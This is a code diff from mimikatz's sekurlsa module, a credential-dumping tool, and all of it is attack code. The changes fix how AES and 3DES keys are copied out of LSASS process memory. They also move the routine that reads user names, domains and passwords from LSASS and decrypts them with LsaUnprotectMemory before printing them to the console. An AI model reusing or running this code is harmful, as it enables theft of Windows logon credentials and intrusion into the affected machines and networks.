@@ -295,13 +295,13 @@ bool mod_mimikatz_sekurlsa::searchLSASSDatas()
 								if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(hAesKey) - addrMonModule), &ptrBase, sizeof(PBYTE), hLSASS))
 									if(mod_memory::readMemory(ptrBase, &maCle, sizeof(KIWI_BCRYPT_KEY), hLSASS))
 										if(mod_memory::readMemory(maCle.cle, &maCleData, sizeof(KIWI_BCRYPT_KEY_DATA), hLSASS))
-											if(mod_memory::readMemory(maCle.cle, (*hAesKey)->cle, maCleData.size - 2*sizeof(PVOID), hLSASS)) /* 2 pointeurs internes à la fin, la structure de départ me semble inutile ^o) */
+											if(mod_memory::readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), &(*hAesKey)->cle->data, maCleData.size - FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data) - 2*sizeof(PVOID), hLSASS)) // 2 pointeurs internes à la fin, la structure de départ n'était pas inutile ;)
 												mesSucces++;
-
-								if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(h3DesKey) - addrMonModule), &ptrBase, sizeof(PBYTE), hLSASS)) /* la structure de départ me semble inutile ^o) */
+								
+								if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(h3DesKey) - addrMonModule), &ptrBase, sizeof(PBYTE), hLSASS))
 									if(mod_memory::readMemory(ptrBase, &maCle, sizeof(KIWI_BCRYPT_KEY), hLSASS))
 										if(mod_memory::readMemory(maCle.cle, &maCleData, sizeof(KIWI_BCRYPT_KEY_DATA), hLSASS))
-											if(mod_memory::readMemory(maCle.cle, (*h3DesKey)->cle, maCleData.size, hLSASS))
+											if(mod_memory::readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), &(*h3DesKey)->cle->data, maCleData.size - FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), hLSASS))
 												mesSucces++;
 							}
 						}
@@ -372,34 +372,17 @@ PVOID mod_mimikatz_sekurlsa::getPtrFromAVLByLuidRec(PRTL_AVL_TABLE pTable, unsig
 	return resultat;
 }
 
-wstring mod_mimikatz_sekurlsa::getUnicodeString(LSA_UNICODE_STRING * ptrString, bool isPassword)
-{
-	wstring maChaine;
-	if(ptrString->Buffer && (ptrString->Length > 0))
-	{
-		BYTE * monBuffer = new BYTE[ptrString->MaximumLength];
-		if(mod_memory::readMemory(ptrString->Buffer, monBuffer, ptrString->MaximumLength, hLSASS))
-		{
-			if(isPassword)
-				SeckPkgFunctionTable->LsaUnprotectMemory(monBuffer, ptrString->MaximumLength);
-			maChaine.assign(mod_text::stringOrHex(reinterpret_cast<PBYTE>(monBuffer), ptrString->Length));
-		}
-		delete[] monBuffer;
-	}
-	return maChaine;
-}
-
 void mod_mimikatz_sekurlsa::genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isTsPkg)
 {
 	if(mesCreds)
 	{
-		wstring password = getUnicodeString(&mesCreds->Password, true);
+		wstring password = mod_process::getUnicodeStringOfProcess(&mesCreds->Password, hLSASS, SeckPkgFunctionTable->LsaUnprotectMemory);//getUnicodeString(&mesCreds->Password, true);
 		if(justSecurity)
 			wcout << password;
 		else
 		{
-			wstring userName = getUnicodeString(&mesCreds->UserName);
-			wstring domainName = getUnicodeString(&mesCreds->Domaine);
+			wstring userName = mod_process::getUnicodeStringOfProcess(&mesCreds->UserName, hLSASS);
+			wstring domainName = mod_process::getUnicodeStringOfProcess(&mesCreds->Domaine, hLSASS);
 			wcout << endl <<
 					L"\t * Utilisateur  : " << (isTsPkg ? domainName : userName) << endl <<
 					L"\t * Domaine      : " << (isTsPkg ? userName : domainName) << endl <<
